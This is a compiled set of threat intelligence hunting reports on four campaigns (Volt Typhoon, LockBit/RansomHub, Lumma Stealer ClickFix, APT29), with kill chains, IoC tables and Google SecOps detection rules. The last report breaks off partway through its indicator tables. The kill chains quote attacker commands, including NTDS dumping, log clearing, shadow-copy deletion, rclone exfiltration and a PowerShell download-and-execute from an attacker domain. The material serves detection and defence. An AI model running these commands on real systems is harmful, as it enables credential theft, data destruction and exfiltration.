# Threat Intelligence & SecOps Hunting Report: Volt Typhoon KV-Botnet Edge Router Zero-Day & Living-off-the-Land Campaign (CVE-2026-21409)

- **Report ID:** `ti-2026-001`
- **Severity:** **Critical** (CVSS 9.8)
- **Published:** 2026-11-05T16:58:57.411Z
- **Source:** [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **Threat Actor / Cluster:** Volt Typhoon (APT Groups)
- **Malware Family:** KV-Botnet (Botnets)
- **CVE References:** CVE-2026-21409, CVE-2025-39112
- **Target Industries:** Critical Infrastructure/Energy, Telecom, Government
- **Target Regions:** North America, APAC, Global

---

## 1. Executive Summary

Volt Typhoon (Bronze Silhouette) is actively exploiting CVE-2026-21409, a critical pre-authentication command injection flaw in enterprise SD-WAN and SOHO edge appliances. Upon gaining access, operators avoid dropping custom malware to disk on internal hosts—instead chaining native Windows administrative utilities (ntdsutil, netsh, wmic, and PowerShell) to harvest Active Directory credentials, configure covert port-forwarding proxies, and maintain multi-month persistence inside Critical Infrastructure, Energy, and Telecom environments.

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: Unauthenticated SD-WAN Appliance Exploit (CVE-2026-21409) (`T1190`)
Sends crafted HTTP management frames to exposed WAN interfaces to execute root shell commands and enroll the router into the KV-Botnet proxy mesh.
- **Observed Artifact / Command:** `POST /cgi-bin/diagnostics_wan.cgi HTTP/1.1`

### 2. Execution: Living-off-the-Land WMI & PowerShell Discovery (`T1047`)
Executes native wmic and PowerShell commands from compromised jump hosts to enumerate domain controllers and network topology.
- **Observed Artifact / Command:** `wmic process call create "cmd.exe /c ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\Windows\Temp\pro\" q q"`

### 3. Persistence: Netsh Portproxy Covert Relay Creation (`T1090.001`)
Configures persistent Windows netsh interface portproxy rules on internal servers to blend C2 traffic with legitimate RDP and SMB flows.
- **Observed Artifact / Command:** `netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=445 connectaddress=10.40.1.10`

### 4. Privilege Escalation: Volume Shadow Copy & NTDS.dit Offline Extraction (`T1003.003`)
Creates shadow copies via vssadmin/ntdsutil to extract the Active Directory database offline and crack domain administrator NTLM hashes.
- **Observed Artifact / Command:** `vssadmin create shadow /for=C: > C:\Windows\Temp\tmp.cab`

### 5. Defense Evasion: Selective Event Log Deletion & Timestamp Stomping (`T1070.001`)
Clears Windows Security (Event ID 4624/4688) and System logs around authentication windows using wevtutil.
- **Observed Artifact / Command:** `wevtutil cl Security && wevtutil cl System`

### 6. Lateral Movement: Pass-the-Hash via Valid Domain Admin Accounts (`T1078.002`)
Moves laterally into OT/SCADA engineering workstations using stolen privileged domain credentials.
- **Observed Artifact / Command:** `impacket-wmiexec Administrator@10.40.12.5`

### 7. Exfiltration & Impact: Multi-Hop Encrypted Tunnel Exfiltration via KV-Botnet Nodes (`T1041`)
Exfiltrates network architecture diagrams, SCADA configuration schemas, and AD databases through compromised SOHO router hops.
- **Observed Artifact / Command:** `TLS 1.3 Tunnel -> 172.104.91.214:8443`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploits CVE-2026-21409 on internet-facing SD-WAN appliances. |
| **Execution** | `T1047` | Windows Management Instrumentation | Uses WMI for remote command execution and AD discovery. |
| **Credential Access** | `T1003.003` | OS Credential Dumping: NTDS | Extracts ntds.dit via ntdsutil IFM media creation. |
| **Command and Control** | `T1090.001` | Proxy: Internal Proxy | Chains netsh portproxy rules across internal Windows servers. |
| **Defense Evasion** | `T1078.002` | Valid Accounts: Domain Accounts | Operates almost exclusively through compromised legitimate credentials. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `8f4b2e91c7d3a054e16b9847c12d390fa88b123490ce71ab56d0219e84c710aa` | `kv_mips_stage2.elf` |
| SHA-1 | `4a91c082f7e12d33b98104c5e77f2109ab34d891` | `wan_diag_helper.sh` |
| MD5 | `d91b448201fc8923ab0192fe7712ca90` | `pro_ntds_dump.cab` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `172.104.91.214` | KV-Botnet Tier-1 Relay Node (TCP/8443) |
| IPv4 | `45.77.182.19` | Volt Typhoon Operational Management Server (TCP/443) |
| Domain | `wan-firmware-check-global.net` | Router Implant Check-in Domain (DNS / HTTPS) |
| URL | `https://wan-firmware-check-global.net/v2/cfg/mips64.bin` | Stage-2 Router Memory Implant URI (HTTPS) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\pro" q q` | Offline Active Directory NTDS database dump via ntdsutil |
| Command Line | `netsh interface portproxy add v4tov4 listenport=50100 connectport=445` | Internal portproxy tunnel configuration for lateral pivoting |
| Registry Key | `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp` | Registry artifact written when netsh portproxy rules are created |
| File Path | `C:\Windows\Temp\pro\Active Directory\ntds.dit` | Staged Active Directory database prior to exfiltration |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: Volt Typhoon KV-Botnet Edge Router Zero-Day & Living-off-the-Land Campaign (CVE-2026-21409)
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("172.104.91.214", "45.77.182.19") or
  principal.ip in ("172.104.91.214", "45.77.182.19") or
  network.dns.questions.name in ("wan-firmware-check-global.net") or
  target.hostname in ("wan-firmware-check-global.net") or
  target.file.sha256 in ("8f4b2e91c7d3a054e16b9847c12d390fa88b123490ce71ab56d0219e84c710aa") or
  principal.process.file.sha256 in ("8f4b2e91c7d3a054e16b9847c12d390fa88b123490ce71ab56d0219e84c710aa") or
  target.file.md5 in ("d91b448201fc8923ab0192fe7712ca90") or
  target.url in ("https://wan-firmware-check-global.net/v2/cfg/mips64.bin")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: KV-Botnet
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  principal.process.file.full_path = /.*(ntds\.dit).*/ nocase or
  target.process.file.full_path = /.*(ntds\.dit).*/ nocase or
  target.process.command_line = /.*ntdsutil.*/ nocase or
  target.registry.registry_key = /.*tcp.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`volt_typhoon_kv_botnet_edge_router_zero_day__ti2026`)
```yara
rule volt_typhoon_kv_botnet_edge_router_zero_day__ti2026 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with Volt Typhoon KV-Botnet Edge Router Zero-Day & Living-off-the-Land Campaign (CVE-2026-21409)"
    severity = "CRITICAL"
    priority = "HIGH"
    mitre_attack = "T1190, T1047, T1003.003, T1090.001, T1078.002"
    cve_references = "CVE-2026-21409, CVE-2025-39112"
    threat_actor = "Volt Typhoon"
    malware_family = "KV-Botnet"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("8f4b2e91c7d3a054e16b9847c12d390fa88b123490ce71ab56d0219e84c710aa") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("172.104.91.214", "45.77.182.19") or
      $net.network.dns.questions.name in ("wan-firmware-check-global.net") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(95)
    $mitre_techniques = array_distinct("T1190, T1047, T1003.003, T1090.001, T1078.002")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```


---

# Threat Intelligence & SecOps Hunting Report: LockBit 4.0 & RansomHub Dual-Extortion Wave Targeting BFSI & Healthcare VMware ESXi Hypervisors

- **Report ID:** `ti-2026-002`
- **Severity:** **Critical** (CVSS 9.6)
- **Published:** 2026-11-05T15:58:57.412Z
- **Source:** [The Hacker News](https://thehackernews.com/)
- **Threat Actor / Cluster:** RansomHub & LockBit Affiliates (Zero-Day Exploits)
- **Malware Family:** LockBit (Ransomware)
- **CVE References:** CVE-2026-1088, CVE-2025-22457
- **Target Industries:** Finance/BFSI, Healthcare, Manufacturing
- **Target Regions:** North America, Europe, APAC

---

## 1. Executive Summary

A high-velocity campaign attributed to LockBit 4.0 and RansomHub affiliates is targeting Finance/BFSI and Healthcare enterprises across North America, Europe, and APAC. Operators gain initial access through unpatched VPN concentrators (CVE-2026-1088), dump credentials from Veeam Backup & Replication PostgreSQL databases, and pivot via SSH directly to VMware ESXi hypervisors to terminate running virtual machines via esxcli before encrypting datastore volumes.

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: VPN Concentrator Buffer Overflow Exploitation (CVE-2026-1088) (`T1190`)
Bypasses authentication on perimeter SSL-VPN gateways and hijacks active administrative sessions.
- **Observed Artifact / Command:** `POST /dana-na/auth/url_admin/welcome.cgi`

### 2. Execution: PowerShell Cobalt Strike & Sliver Beacon Deployment (`T1218.011`)
Executes reflective DLL loader in memory to establish resilient command and control.
- **Observed Artifact / Command:** `rundll32.exe C:\ProgramData\Comms\netutils_sync.dll,DllRegisterServer`

### 3. Persistence: AnyDesk / Atera RMM Silent Installation (`T1219`)
Installs legitimate Remote Monitoring and Management (RMM) software in unattended service mode as backup access.
- **Observed Artifact / Command:** `msiexec.exe /i C:\Users\Public\setup_rmm.msi /qn`

### 4. Privilege Escalation: Veeam Backup Credential Harvesting (`T1555`)
Queries local SQL/PostgreSQL instances on backup servers to extract stored ESXi root and Domain Admin credentials.
- **Observed Artifact / Command:** `psql.exe -U postgres -d VeeamBackup -c "SELECT * FROM Credentials"`

### 5. Defense Evasion: BYOVD (Bring Your Own Vulnerable Driver) EDR Termination (`T1562.001`)
Drops a signed vulnerable kernel driver (poortry.sys) to terminate endpoint detection kernel callbacks.
- **Observed Artifact / Command:** `sc.exe create SysDrvCore binPath= "C:\Windows\Temp\poortry.sys" type= kernel`

### 6. Lateral Movement: SSH Pivot to VMware ESXi Management Plane (`T1021.004`)
Enables SSH on ESXi hosts via vCenter and transfers the ELF64 Rust encryptor to /tmp/.
- **Observed Artifact / Command:** `esxcli vm process list && esxcli vm process kill --type=force --world-id=ALL`

### 7. Exfiltration & Impact: Rclone Mega/S3 Exfiltration & ESXi Datastore Encryption (`T1486`)
Exfiltrates sensitive financial & patient records using Rclone before encrypting .vmdk and .vmx files across all LUNs.
- **Observed Artifact / Command:** `rclone.exe copy "\\fileserver\finance" remote:bucket-exfil --transfers 32`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploits CVE-2026-1088 on enterprise VPN gateways. |
| **Defense Evasion** | `T1562.001` | Impair Defenses: Disable or Modify Tools | Uses BYOVD kernel driver to blind EDR sensors. |
| **Command and Control** | `T1219` | Remote Access Software | Abuses commercial RMM tools for persistent interactive access. |
| **Exfiltration** | `T1567.002` | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Uses renamed rclone.exe binary to stream data to external S3 buckets. |
| **Impact** | `T1486` | Data Encrypted for Impact | Encrypts VMware ESXi VMFS datastores and Windows SMB shares. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `3c90e1f8452a6b77d09142c8a3b55f190e842c11ab99402d67e12904fa18c321` | `lockbit4_esxi_linux_amd64.elf` |
| SHA-256 | `9a11b208f4c5d7821e330a94bc81209fa771230c8421b90e5541a23f0981d44e` | `poortry.sys` |
| MD5 | `7f8102c94a11b802e34910cd8821fa04` | `svchost_rclone.exe` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `193.149.176.88` | Cobalt Strike / Sliver HTTPS C2 Server (TCP/443) |
| IPv4 | `185.215.113.42` | Rclone Exfiltration Endpoint (TCP/443) |
| Domain | `cdn-veeam-telemetry-sync.com` | Stage-2 Beacon Domain (HTTPS) |
| URL | `https://cdn-veeam-telemetry-sync.com/static/esxi_crypt.bin` | ESXi Encryptor Payload URL (HTTPS) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `vssadmin.exe delete shadows /all /quiet && wmic shadowcopy delete` | Volume shadow copy deletion prior to encryption |
| Command Line | `rclone.exe copy "\\10.0.0.12\shares" mega:dump_bfsi --mega-user` | Bulk data exfiltration via Rclone |
| File Path | `C:\Windows\Temp\poortry.sys` | Malicious BYOVD kernel driver dropped to disk |
| Mutex | `Global\LB4_RANSOMHUB_SYNC_991A` | Encryptor single-instance mutex |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: LockBit 4.0 & RansomHub Dual-Extortion Wave Targeting BFSI & Healthcare VMware ESXi Hypervisors
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("193.149.176.88", "185.215.113.42") or
  principal.ip in ("193.149.176.88", "185.215.113.42") or
  network.dns.questions.name in ("cdn-veeam-telemetry-sync.com") or
  target.hostname in ("cdn-veeam-telemetry-sync.com") or
  target.file.sha256 in ("3c90e1f8452a6b77d09142c8a3b55f190e842c11ab99402d67e12904fa18c321", "9a11b208f4c5d7821e330a94bc81209fa771230c8421b90e5541a23f0981d44e") or
  principal.process.file.sha256 in ("3c90e1f8452a6b77d09142c8a3b55f190e842c11ab99402d67e12904fa18c321", "9a11b208f4c5d7821e330a94bc81209fa771230c8421b90e5541a23f0981d44e") or
  target.file.md5 in ("7f8102c94a11b802e34910cd8821fa04") or
  target.url in ("https://cdn-veeam-telemetry-sync.com/static/esxi_crypt.bin")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: LockBit
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  principal.process.file.full_path = /.*(poortry\.sys).*/ nocase or
  target.process.file.full_path = /.*(poortry\.sys).*/ nocase or
  target.process.command_line = /.*vssadmin\.exe.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`lockbit_4_0_ransomhub_dual_extortion_wave_ta_ti2026`)
```yara
rule lockbit_4_0_ransomhub_dual_extortion_wave_ta_ti2026 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with LockBit 4.0 & RansomHub Dual-Extortion Wave Targeting BFSI & Healthcare VMware ESXi Hypervisors"
    severity = "CRITICAL"
    priority = "HIGH"
    mitre_attack = "T1190, T1562.001, T1219, T1567.002, T1486"
    cve_references = "CVE-2026-1088, CVE-2025-22457"
    threat_actor = "RansomHub & LockBit Affiliates"
    malware_family = "LockBit"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("3c90e1f8452a6b77d09142c8a3b55f190e842c11ab99402d67e12904fa18c321", "9a11b208f4c5d7821e330a94bc81209fa771230c8421b90e5541a23f0981d44e") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("193.149.176.88", "185.215.113.42") or
      $net.network.dns.questions.name in ("cdn-veeam-telemetry-sync.com") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(95)
    $mitre_techniques = array_distinct("T1190, T1562.001, T1219, T1567.002, T1486")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```


---

# Threat Intelligence & SecOps Hunting Report: Lumma Stealer & RedLine MaaS Campaign Abusing Fake CAPTCHA & ClickFix PowerShell Lures

- **Report ID:** `ti-2026-003`
- **Severity:** **High** (CVSS 8.6)
- **Published:** 2026-11-05T14:03:57.412Z
- **Source:** [BleepingComputer](https://www.bleepingcomputer.com/)
- **Threat Actor / Cluster:** Storm-1607 MaaS Affiliates (Phishing/BEC)
- **Malware Family:** Lumma Stealer (InfoStealers)
- **CVE References:** CVE-2025-21333
- **Target Industries:** Technology/SaaS, Retail, Finance/BFSI
- **Target Regions:** APAC, Europe, LATAM, Global

---

## 1. Executive Summary

Threat researchers at BleepingComputer and Unit 42 have tracked a surge in "ClickFix" social engineering attacks delivering Lumma Stealer, RedLine, and Vidar info-stealers across Technology/SaaS, Retail, and Finance sectors in APAC, Europe, and LATAM. Compromised websites and malvertising redirects prompt victims with a spoofed "Verify You Are Human" dialog that copies an obfuscated mshta.exe / PowerShell command into the Windows clipboard and instructs the user to press Win+R and Enter.

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: ClickFix Fake Verification Clipboard Injection (`T1204.002`)
JavaScript navigator.clipboard.writeText() silently injects a malicious mshta/PowerShell one-liner when the user clicks "Verify".
- **Observed Artifact / Command:** `mshta.exe https://verify-human-cloudflare-check.cc/captcha.hta`

### 2. Execution: MSHTA & PowerShell Fileless Loader Execution (`T1218.005`)
Executes embedded VBScript/PowerShell inside mshta.exe to retrieve AES-encrypted Lumma Stealer shellcode.
- **Observed Artifact / Command:** `powershell.exe -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://verify-human-cloudflare-check.cc/l.ps1')"`

### 3. Persistence: Startup Folder LNK & Scheduled Task Creation (`T1547.001`)
Drops a disguised shortcut in the user Startup directory pointing to a legitimate signed binary that side-loads the stealer.
- **Observed Artifact / Command:** `C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk`

### 4. Privilege Escalation: COM Elevation Moniker UAC Bypass (`T1548.002`)
Uses CMSTP / ICMLuaUtil COM interface to elevate process privileges without triggering a UAC prompt.
- **Observed Artifact / Command:** `dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`

### 5. Defense Evasion: Process Hollowing into RegAsm.exe / MSBuild.exe (`T1055.012`)
Hollows out a suspended legitimate .NET framework binary (RegAsm.exe) and maps Lumma Stealer into its virtual memory.
- **Observed Artifact / Command:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe`

### 6. Lateral Movement: Session Cookie & Cloud OAuth Token Replay (`T1539`)
Extracts Chromium App-Bound Encryption (ABE) cookies, AWS/Azure CLI tokens, and VPN profiles to hijack corporate SSO sessions.
- **Observed Artifact / Command:** `C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies`

### 7. Exfiltration & Impact: Compressed ZIP Archive Exfiltration Over Telegram & HTTPS C2 (`T1041`)
Packages stolen browser vaults, cryptocurrency wallets, and corporate credentials into an in-memory ZIP sent to C2.
- **Observed Artifact / Command:** `POST https://lumma-gate-panel99.su/api/gate`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Execution** | `T1204.002` | User Execution: Malicious File / Paste | Tricks user into executing clipboard command via Windows Run dialog. |
| **Defense Evasion** | `T1218.005` | System Binary Proxy Execution: Mshta | Proxies execution of remote HTA payload via mshta.exe. |
| **Defense Evasion** | `T1055.012` | Process Injection: Process Hollowing | Injects Lumma Stealer into suspended RegAsm.exe process. |
| **Credential Access** | `T1539` | Steal Web Session Cookie | Bypasses Chrome App-Bound Encryption to steal active SSO cookies. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `5e81a4092c11f8730b4291d8c6a002e91f8823c401a9283bd71e6509a23c4410` | `lumma_v5_build.exe` |
| SHA-1 | `1c8902a45f11b7823e0914d6a8821c09e4123b99` | `captcha.hta` |
| MD5 | `a0912e4481bc72910d4451ef9012ab33` | `l.ps1` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `104.21.64.119` | ClickFix Lure Delivery Server (TCP/443) |
| Domain | `verify-human-cloudflare-check.cc` | Fake CAPTCHA Initial Stage Host (HTTPS) |
| Domain | `lumma-gate-panel99.su` | Lumma Stealer C2 Exfiltration Gate (HTTPS) |
| URL | `https://verify-human-cloudflare-check.cc/captcha.hta` | Malicious HTA Payload URL (HTTPS) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `mshta.exe https://verify-human-cloudflare-check.cc/captcha.hta` | Executed directly from Explorer.exe (Win+R Run dialog) |
| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` | Stores history of commands pasted into the Windows Run (Win+R) dialog |
| File Path | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe` | Target binary used for process hollowing making outbound C2 connections |
| Named Pipe | `\\.\pipe\chrome_abe_elevate_ipc` | Named pipe abused during browser cookie decryption |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: Lumma Stealer & RedLine MaaS Campaign Abusing Fake CAPTCHA & ClickFix PowerShell Lures
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("104.21.64.119") or
  principal.ip in ("104.21.64.119") or
  network.dns.questions.name in ("verify-human-cloudflare-check.cc", "lumma-gate-panel99.su") or
  target.hostname in ("verify-human-cloudflare-check.cc", "lumma-gate-panel99.su") or
  target.file.sha256 in ("5e81a4092c11f8730b4291d8c6a002e91f8823c401a9283bd71e6509a23c4410") or
  principal.process.file.sha256 in ("5e81a4092c11f8730b4291d8c6a002e91f8823c401a9283bd71e6509a23c4410") or
  target.file.md5 in ("a0912e4481bc72910d4451ef9012ab33") or
  target.url in ("https://verify-human-cloudflare-check.cc/captcha.hta")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: Lumma Stealer
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  principal.process.file.full_path = /.*(RegAsm\.exe).*/ nocase or
  target.process.file.full_path = /.*(RegAsm\.exe).*/ nocase or
  target.process.command_line = /.*mshta\.exe.*/ nocase or
  target.registry.registry_key = /.*RunMRU.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`lumma_stealer_redline_maas_campaign_abusing__ti2026`)
```yara
rule lumma_stealer_redline_maas_campaign_abusing__ti2026 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with Lumma Stealer & RedLine MaaS Campaign Abusing Fake CAPTCHA & ClickFix PowerShell Lures"
    severity = "HIGH"
    priority = "MEDIUM"
    mitre_attack = "T1204.002, T1218.005, T1055.012, T1539"
    cve_references = "CVE-2025-21333"
    threat_actor = "Storm-1607 MaaS Affiliates"
    malware_family = "Lumma Stealer"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("5e81a4092c11f8730b4291d8c6a002e91f8823c401a9283bd71e6509a23c4410") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("104.21.64.119") or
      $net.network.dns.questions.name in ("verify-human-cloudflare-check.cc", "lumma-gate-panel99.su") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(80)
    $mitre_techniques = array_distinct("T1204.002, T1218.005, T1055.012, T1539")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```


---

# Threat Intelligence & SecOps Hunting Report: APT29 (Midnight Blizzard) OAuth Token & Entra ID Cross-Tenant Cloud Identity Intrusion

- **Report ID:** `ti-2026-004`
- **Severity:** **Critical** (CVSS 9.4)
- **Published:** 2026-11-05T03:33:57.412Z
- **Source:** [Mandiant Threat Intel](https://www.mandiant.com/resources/blog)
- **Threat Actor / Cluster:** APT29 (Cloud/Identity Attacks)
- **Malware Family:** GraphAPI-Backdoor (RATs)
- **CVE References:** CVE-2025-49011
- **Target Industries:** Government, Technology/SaaS, Telecom
- **Target Regions:** Europe, North America, Middle East

---

## 1. Executive Summary

Mandiant and Microsoft Threat Intelligence report sustained cloud identity intrusions by APT29 (Midnight Blizzard) targeting Government, Technology/SaaS, and Defense organizations in Europe, North America, and Middle East. The actor leverages residential proxy networks to perform low-and-slow password spraying against non-MFA legacy test tenants, then registers rogue multi-tenant OAuth applications granted high-privilege Microsoft Graph API permissions (RoleManagement.ReadWrite.Directory and Mail.ReadWrite).

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: Residential Proxy Password Spray on Legacy Test Tenant (`T1110.003`)
Distributes authentication attempts across thousands of residential SOCKS5 exit nodes targeting dormant staging accounts.
- **Observed Artifact / Command:** `POST https://login.microsoftonline.com/common/oauth2/token`

### 2. Execution: Azure CLI & AADInternals Script Execution (`T1059.009`)
Uses AADInternals and custom Python Graph API scripts to enumerate service principals and federated trusts.
- **Observed Artifact / Command:** `Invoke-AADIntReconAsInsider -Tenant "corp.onmicrosoft.com"`

### 3. Persistence: Rogue OAuth Service Principal Credential Addition (`T1098.001`)
Adds a new client secret and X.509 certificate to an existing trusted OAuth enterprise application.
- **Observed Artifact / Command:** `POST https://graph.microsoft.com/v1.0/applications/{id}/addPassword`

### 4. Privilege Escalation: AppRoleAssignment Grant for Directory & Mail ReadWrite (`T1098.003`)
Assigns Exchange.ManageAsApp and RoleManagement.ReadWrite.Directory permissions to the compromised service principal.
- **Observed Artifact / Command:** `POST https://graph.microsoft.com/v1.0/servicePrincipals/{id}/appRoleAssignments`

### 5. Defense Evasion: Conditional Access Policy Exemption & Residential IP Rotation (`T1562.008`)
Routes all Graph API queries through rotating geo-matched residential proxies matching victim headquarters.
- **Observed Artifact / Command:** `User-Agent: Mozilla/5.0 (compatible; MSAL-Python/1.28.0)`

### 6. Lateral Movement: Cross-Tenant Synchronization & Federated IdP Pivot (`T1550.001`)
Pivots from staging tenant into production corporate tenant via B2B cross-tenant access trust settings.
- **Observed Artifact / Command:** `PATCH https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy`

### 7. Exfiltration & Impact: Automated Graph API Executive Mailbox & Source Code Exfiltration (`T1114.002`)
Continuously queries /users/{id}/messages and SharePoint vaults for cybersecurity and diplomatic correspondence.
- **Observed Artifact / Command:** `GET https://graph.microsoft.com/v1.0/users/secops@corp.com/messages?$top=500`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1110.003` | Brute Force: Password Spraying | Low-velocity password spraying via residential proxy mesh. |
| **Persistence** | `T1098.001` | Account Manipulation: Additional Cloud Credentials | Injects rogue client secrets into trusted OAuth service principals. |
| **Privilege Escalation** | `T1098.003` | Account Manipulation: Additional Cloud Roles | Grants Global Administrator and Mail.ReadWrite Graph API roles. |
| **Defense Evasion** | `T1550.001` | Use Alternate Authentication Material: Application Access Token | Bypasses interactive MFA checks using OAuth bearer tokens. |
| **Collection** | `T1114.002` | Email Collection: Remote Email Collection | Harvests executive and security team mailboxes via MS Graph API. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `1d77c8902a44e612b09384f712c90a8834b1209fe7612a409cb812390ef41a20` | `graph_harvester_worker.py` |
| MD5 | `e44190c82a117b9034f812c09a4412b8` | `oauth_cert_rogue.pfx` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `194.36.191.74` | APT29 OAuth Token Replay Exit Node (TCP/443) |
| IPv4 | `91.199.84.112` | SOCKS5 Residential Proxy Aggregator (TCP/1080) |
| Domain | `login-msft-sso-federation.org` | AiTM Token Capture Relay (HTTPS) |
